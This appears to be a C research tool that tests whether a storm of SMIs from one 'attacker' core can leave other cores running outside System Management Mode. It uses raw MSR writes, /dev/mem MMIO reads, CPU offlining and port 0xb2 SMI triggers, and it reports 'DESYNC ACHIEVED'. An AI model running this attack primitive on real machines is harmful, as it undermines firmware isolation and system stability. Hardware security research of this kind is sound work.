/* smiiiiiiiiiiiiiiii: SMI desynchronization experiment
 *
 * Offlines CPUs 4+, configures AMD SMI perf counters on CPUs 0-3,
 * fires a probe SMI, then runs N SMIs from CPU 0 while a background
 * process on CPU 1 loops doing timed vector reads (xmm/ymm/zmm) from the
 * target. The vector register width is selectable via -r (default: xmm).
 *
 * Requires: root, /dev/mem, /dev/cpu/N/msr, CONFIG_X86_MSR, AVX
 *           (AVX-512 when -r zmm is selected).
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/io.h>
#include <sched.h>
#include <signal.h>
#include <cpuid.h>

/* Default physical address to read in the background timing loop
 * (override with -a <addr>) */
#define TARGET_PHYS 0xfcc68860UL

/* Selected physical address; default is TARGET_PHYS. */
static uint64_t g_target_phys = TARGET_PHYS;

#define ACTIVE_CPUS 4 /* CPUs 0-(N-1) kept online; N+ offlined for the run */
#define SMI_CPU 0     /* CPU that fires SMIs */
#define MMIO_CPU 1    /* CPU that runs the background MMIO timing loop */

/* AMD core perf counter 0 (MSRC001_020x): event-select and counter */
#define MSR_PERF_CTL0 0xc0010200u
#define MSR_PERF_CTR0 0xc0010201u
#define SMI_COUNT 10 /* number of SMIs to fire in the main loop */

/* ---- Vector register width for the MMIO read (selectable via -r) ---- */

enum reg_width
{
    REG_XMM, /* 16-byte read (AVX)      */
    REG_YMM, /* 32-byte read (AVX)      */
    REG_ZMM, /* 64-byte read (AVX-512)  */
};

/* Selected register width; default is xmm. */
static enum reg_width g_reg = REG_XMM;

static const char *reg_name(enum reg_width w)
{
    switch (w)
    {
    case REG_XMM:
        return "xmm";
    case REG_YMM:
        return "ymm";
    case REG_ZMM:
        return "zmm";
    }
    return "?";
}

/* Next size up, or NULL if already at the widest. */
static const char *reg_next(enum reg_width w)
{
    switch (w)
    {
    case REG_XMM:
        return "ymm";
    case REG_YMM:
        return "zmm";
    case REG_ZMM:
        return NULL;
    }
    return NULL;
}

/* ---- CPU affinity ---- */

static void pin_cpu(int cpu)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    if (sched_setaffinity(0, sizeof(mask), &mask))
    {
        perror("sched_setaffinity");
        exit(1);
    }
}

/* ---- CPU hotplug ---- */

static void cpu_set_online(int cpu, int online)
{
    char path[64];
    snprintf(path, sizeof(path), "/sys/devices/system/cpu/cpu%d/online", cpu);
    int fd = open(path, O_WRONLY);
    if (fd < 0)
    {
        perror(path);
        return;
    }
    (void)!write(fd, online ? "1\n" : "0\n", 2);
    close(fd);
}

/* ---- MSR access via /dev/cpu/N/msr ---- */

static int msr_write(int cpu, uint32_t reg, uint64_t val)
{
    char path[64];
    snprintf(path, sizeof(path), "/dev/cpu/%d/msr", cpu);
    int fd = open(path, O_WRONLY);
    if (fd < 0)
    {
        perror(path);
        return -1;
    }
    int r = (pwrite(fd, &val, sizeof(val), reg) == sizeof(val)) ? 0 : -1;
    if (r)
        perror("msr pwrite");
    close(fd);
    return r;
}

static int msr_read(int cpu, uint32_t reg, uint64_t *val)
{
    char path[64];
    snprintf(path, sizeof(path), "/dev/cpu/%d/msr", cpu);
    int fd = open(path, O_RDONLY);
    if (fd < 0)
    {
        perror(path);
        return -1;
    }
    int r = (pread(fd, val, sizeof(*val), reg) == sizeof(*val)) ? 0 : -1;
    if (r)
        perror("msr pread");
    close(fd);
    return r;
}

/* ---- CPU vendor check ---- */

static int cpu_is_amd(void)
{
    unsigned int eax, ebx, ecx, edx;
    __get_cpuid(0, &eax, &ebx, &ecx, &edx);
    /* vendor string "AuthenticAMD": EBX="Auth", EDX="enti", ECX="cAMD" */
    return ebx == 0x68747541u && edx == 0x69746e65u && ecx == 0x444d4163u;
}

/* ---- MMIO setup (maps a single page containing g_target_phys) ---- */

static volatile uint8_t *mmio_va;

static void setup_mmio(void)
{
    size_t pagesize = (size_t)sysconf(_SC_PAGE_SIZE);
    off_t page_base = (off_t)(g_target_phys / pagesize * pagesize);
    off_t page_offset = (off_t)(g_target_phys - (uint64_t)page_base);

    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd < 0)
    {
        perror("open /dev/mem");
        exit(1);
    }
    void *m = mmap(NULL, (size_t)(page_offset + pagesize),
                   PROT_READ | PROT_WRITE, MAP_SHARED, fd, page_base);
    close(fd);
    if (m == MAP_FAILED)
    {
        perror("mmap /dev/mem");
        exit(1);
    }
    mmio_va = (volatile uint8_t *)m + page_offset;
}

/* ---- Timed vector read (mirrors mmiotic.c MMIO_TIME_YMM) ----
 *
 * Reads addr into a vector register (width selected by g_reg) between a
 * pair of serialized rdtsc/rdtscp samples and returns the cycle delta.
 * The three widths are separate asm blocks because the register operand
 * is fixed at compile time. */

static uint64_t mmio_time_vec(volatile void *addr)
{
    uint32_t ch0, cl0, ch1, cl1;
    uint8_t buf[64] __attribute__((aligned(64)));

    switch (g_reg)
    {
    case REG_XMM:
        __asm__ __volatile__(
            "cpuid                        \n\t"
            "rdtsc                        \n\t"
            "movl %%edx, %[ch0]           \n\t"
            "movl %%eax, %[cl0]           \n\t"
            "vmovdqu (%%rsi), %%xmm0      \n\t"
            "rdtscp                       \n\t"
            "movl %%edx, %[ch1]           \n\t"
            "movl %%eax, %[cl1]           \n\t"
            "vmovdqu %%xmm0, (%[buf])     \n\t"
            "cpuid                        \n\t"
            : [ch0] "=&r"(ch0), [cl0] "=&r"(cl0),
              [ch1] "=&r"(ch1), [cl1] "=&r"(cl1)
            : "S"(addr), [buf] "r"(buf)
            : "rax", "rbx", "rcx", "rdx", "xmm0", "memory", "cc");
        break;
    case REG_YMM:
        __asm__ __volatile__(
            "cpuid                        \n\t"
            "rdtsc                        \n\t"
            "movl %%edx, %[ch0]           \n\t"
            "movl %%eax, %[cl0]           \n\t"
            "vmovdqu (%%rsi), %%ymm0      \n\t"
            "rdtscp                       \n\t"
            "movl %%edx, %[ch1]           \n\t"
            "movl %%eax, %[cl1]           \n\t"
            "vmovdqu %%ymm0, (%[buf])     \n\t"
            "cpuid                        \n\t"
            : [ch0] "=&r"(ch0), [cl0] "=&r"(cl0),
              [ch1] "=&r"(ch1), [cl1] "=&r"(cl1)
            : "S"(addr), [buf] "r"(buf)
            : "rax", "rbx", "rcx", "rdx", "ymm0", "memory", "cc");
        break;
    case REG_ZMM:
        __asm__ __volatile__(
            "cpuid                        \n\t"
            "rdtsc                        \n\t"
            "movl %%edx, %[ch0]           \n\t"
            "movl %%eax, %[cl0]           \n\t"
            "vmovdqu64 (%%rsi), %%zmm0    \n\t"
            "rdtscp                       \n\t"
            "movl %%edx, %[ch1]           \n\t"
            "movl %%eax, %[cl1]           \n\t"
            "vmovdqu64 %%zmm0, (%[buf])   \n\t"
            "cpuid                        \n\t"
            : [ch0] "=&r"(ch0), [cl0] "=&r"(cl0),
              [ch1] "=&r"(ch1), [cl1] "=&r"(cl1)
            : "S"(addr), [buf] "r"(buf)
            : "rax", "rbx", "rcx", "rdx", "zmm0", "memory", "cc");
        break;
    }
    uint64_t t0 = ((uint64_t)ch0 << 32) | cl0;
    uint64_t t1 = ((uint64_t)ch1 << 32) | cl1;
    return t1 - t0;
}

/* ---- SMI trigger (outb 0 -> port 0xb2) ---- */

static void do_smi(void)
{
    __asm__ __volatile__("outb %%al, $0xb2" : : "a"((uint8_t)0) :);
}

/* ---- Background MMIO loop (runs in forked child on CPU 1) ---- */

static void mmio_loop(void)
{
    switch (g_reg)
    {
    case REG_XMM:
        for (;;)
            __asm__ __volatile__("vmovdqu (%0), %%xmm0" : : "r"((void *)mmio_va) : "xmm0", "memory");
    case REG_YMM:
        for (;;)
            __asm__ __volatile__("vmovdqu (%0), %%ymm0" : : "r"((void *)mmio_va) : "ymm0", "memory");
    case REG_ZMM:
        for (;;)
            __asm__ __volatile__("vmovdqu64 (%0), %%zmm0" : : "r"((void *)mmio_va) : "zmm0", "memory");
    }
}

static void usage(const char *prog)
{
    fprintf(stderr,
            "usage: %s [-r xmm|ymm|zmm] [-a <phys-addr>]\n"
            "  -r   vector register width for the timed MMIO read (default: xmm)\n"
            "  -a   target physical address to read (default: 0x%lx)\n",
            prog, (unsigned long)TARGET_PHYS);
}

int main(int argc, char **argv)
{
    int i, cpu;
    uint64_t val;
    unsigned int eax, ebx = 0, ecx, edx;
    unsigned int apicid;
    int desync = 0; /* set when SMI counts diverge (desync achieved) */

    /* Parse command line: select the vector register width. */
    for (i = 1; i < argc; i++)
    {
        if (!strcmp(argv[i], "-r") && i + 1 < argc)
        {
            const char *v = argv[++i];
            if (!strcmp(v, "xmm"))
                g_reg = REG_XMM;
            else if (!strcmp(v, "ymm"))
                g_reg = REG_YMM;
            else if (!strcmp(v, "zmm"))
                g_reg = REG_ZMM;
            else
            {
                fprintf(stderr, "unknown register width: %s\n", v);
                usage(argv[0]);
                return 1;
            }
        }
        else if (!strcmp(argv[i], "-a") && i + 1 < argc)
        {
            const char *v = argv[++i];
            char *end;
            unsigned long long a = strtoull(v, &end, 0);
            if (*v == '\0' || *end != '\0')
            {
                fprintf(stderr, "invalid physical address: %s\n", v);
                usage(argv[0]);
                return 1;
            }
            g_target_phys = (uint64_t)a;
        }
        else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help"))
        {
            usage(argv[0]);
            return 0;
        }
        else
        {
            fprintf(stderr, "unexpected argument: %s\n", argv[i]);
            usage(argv[0]);
            return 1;
        }
    }

    printf("\n");
    printf("--- begin ---\n");
    printf("  target physical address: 0x%lx\n", (unsigned long)g_target_phys);
    printf("  vector register width: %s\n", reg_name(g_reg));

    /* Take CPUs 4+ offline */
    int ncpus = (int)sysconf(_SC_NPROCESSORS_CONF);
    for (i = ACTIVE_CPUS; i < ncpus; i++)
        cpu_set_online(i, 0);

    /* Pin to CPU 0 */
    printf("\n");
    printf("--- acquire permissions ---\n");
    pin_cpu(SMI_CPU);
    __get_cpuid(1, &eax, &ebx, &ecx, &edx);
    apicid = (ebx & 0xff000000) >> 24;
    printf("  attacker scheduled on apicid: %d\n", apicid);

    /* Acquire I/O port access for outb */
    if (iopl(3))
    {
        perror("iopl");
        return 1;
    }

    printf("\n");
    printf("--- configure performance counters ---\n");

    /* The SMI perf-counter logic (MSRC001_020x event 0x2b "SMIs Received")
     * is AMD-specific. On non-AMD CPUs the perf MSRs and event encoding do
     * not apply, so skip all SMI counting; the desync experiment itself
     * still runs. */
    int is_amd = cpu_is_amd();
    if (!is_amd)
    {
        printf("  WARNING: non-AMD CPU detected; SMI perf counter logic is\n");
        printf("           AMD-specific and not wired up for this CPU.\n");
        printf("           Skipping SMI counting; desync experiment still runs.\n");
    }

    if (is_amd)
    {
        /* Configure AMD SMI perf counter on CPUs 0-3:
         *   MSR MSR_PERF_CTL0 = 0x43002b  (event select: count SMIs)
         *   MSR MSR_PERF_CTR0 = 0         (clear counter) */
        for (cpu = 0; cpu < ACTIVE_CPUS; cpu++)
            msr_write(cpu, MSR_PERF_CTL0, 0x43002b);
        for (cpu = 0; cpu < ACTIVE_CPUS; cpu++)
            msr_write(cpu, MSR_PERF_CTR0, 0);

        for (cpu = 0; cpu < ACTIVE_CPUS; cpu++)
        {
            msr_read(cpu, MSR_PERF_CTR0, &val);
            printf("  cpu%d initial smi count: %lu\n", cpu, val);
        }

        /* Initial probe SMI */
        printf("  probe smi\n");
        do_smi();

        for (cpu = 0; cpu < ACTIVE_CPUS; cpu++)
        {
            msr_read(cpu, MSR_PERF_CTR0, &val);
            printf("  cpu%d count after probe smi: %lu\n", cpu, val);
        }
    }

    printf("\n");
    printf("--- check desync execution time ---\n");

    /* Map MMIO region before forking so the child inherits the mapping */
    setup_mmio();

    /* Sanity check: print vector MMIO access latency before forking */
    uint64_t vec_cycles = mmio_time_vec((volatile void *)mmio_va);
    printf("  %s mmio access time: %lu cycles\n", reg_name(g_reg), vec_cycles);

    printf("\n");
    printf("--- launch victim ---\n");

    /* Pipe used to signal parent that child is in the mmio loop */
    int ready_pipe[2];
    if (pipe(ready_pipe))
    {
        perror("pipe");
        return 1;
    }

    /* Fork background MMIO timing loop on CPU 1 */
    pid_t loop_pid = fork();
    if (loop_pid < 0)
    {
        perror("fork");
        return 1;
    }
    if (loop_pid == 0)
    {
        close(ready_pipe[0]);
        pin_cpu(MMIO_CPU);
        __get_cpuid(1, &eax, &ebx, &ecx, &edx);
        apicid = (ebx & 0xff000000) >> 24;
        printf("victim scheduled on apicid: %d\n", apicid);

        /* Signal parent that we are entering the loop */
        (void)!write(ready_pipe[1], "\0", 1);
        close(ready_pipe[1]);

        mmio_loop();
        /* unreachable */
        exit(0);
    }
    close(ready_pipe[1]);
    printf("  victim mmio loop running with pid: %d\n", (int)loop_pid);

    /* Wait until child is in the mmio loop before firing SMIs */
    printf("  waiting for mmio loop to be ready...\n");
    char dummy;
    if (read(ready_pipe[0], &dummy, 1) != 1)
    {
        perror("pipe read");
        return 1;
    }
    close(ready_pipe[0]);
    printf("  ...done.\n");

    /* Fire SMIs from CPU 0 */
    printf("\n");
    printf("--- trigger smi storm ---\n");
    for (i = 0; i < SMI_COUNT; i++)
    {
        printf("  smi # %d / %d\r", i, SMI_COUNT);
        fflush(stdout);
        do_smi();
    }
    printf("\n");

    printf("\n");
    printf("--- check desynchronization ---\n");

    /* Terminate background loop */
    kill(loop_pid, SIGTERM);
    printf("  loop terminated.\n");

    if (is_amd)
    {
        /* Final SMI counts */
        uint64_t smi_min = UINT64_MAX, smi_max = 0;
        for (cpu = 0; cpu < ACTIVE_CPUS; cpu++)
        {
            msr_read(cpu, MSR_PERF_CTR0, &val);
            printf("  cpu%d final smi count: %lu\n", cpu, val);
            if (val < smi_min)
                smi_min = val;
            if (val > smi_max)
                smi_max = val;
        }
        uint64_t delta = smi_max - smi_min;
        printf("\n");
        printf("  smi count delta: %lu\n", delta);
        printf("\n");

        if (delta > 0)
        {
            /* Cores disagree on how many SMIs they took: at least one core
             * kept running outside SMM instead of entering the handler. */
            desync = 1;
            printf("  !!! SMI COUNTS DIVERGED ACROSS CORES (max - min = %lu)\n", delta);
            printf("  !!! at least one core did not rendezvous into SMM\n");
            printf("  !!! => desynchronized code execution outside of SMM ACHIEVED\n");
        }
        else
        {
            /* No desync observed: suggest widening the MMIO read to catch it. */
            printf("  cores stayed synchronized; no desync observed.\n");
            const char *next = reg_next(g_reg);
            if (next)
                printf("  try the next register size up: -r %s\n", next);
            else
                printf("  already at the widest register (%s)\n", reg_name(g_reg));
        }
    }
    else
    {
        printf("  smi count check skipped: non-AMD CPU (perf counting not wired up).\n");
    }

    /* Bring CPUs 4+ back online */
    for (i = ACTIVE_CPUS; i < ncpus; i++)
        cpu_set_online(i, 1);

    printf("\n");
    printf("--- end ---\n");
    if (!is_amd)
        printf("  result: NOT MEASURED (non-AMD CPU; perf counting not wired up)\n");
    else if (desync)
        printf("  result: DESYNC ACHIEVED (code executed outside of SMM)\n");
    else
        printf("  result: synchronized (no desync observed)\n");
    printf("\n");

    /* Exit code: 0 = desync achieved, 2 = measured but synchronized,
     * 1 = could not measure (non-AMD). */
    if (!is_amd)
        return 1;
    return desync ? 0 : 2;
}
